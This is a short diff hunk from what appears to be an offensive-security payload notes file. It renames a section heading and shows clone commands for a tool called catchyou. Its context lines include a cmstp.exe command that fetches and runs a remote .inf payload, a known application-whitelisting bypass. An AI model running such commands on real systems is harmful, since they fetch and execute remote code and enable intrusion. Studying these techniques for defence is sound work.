@@ -122,9 +122,9 @@ Cmstp
 cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf
 ```
 
-## Catchyou
-New tool by thelinuxchoice
+## Disk payload
 
+New tool by thelinuxchoice
 ```
 git clone https://github.com/thelinuxchoice/catchyou
 cd catchyou
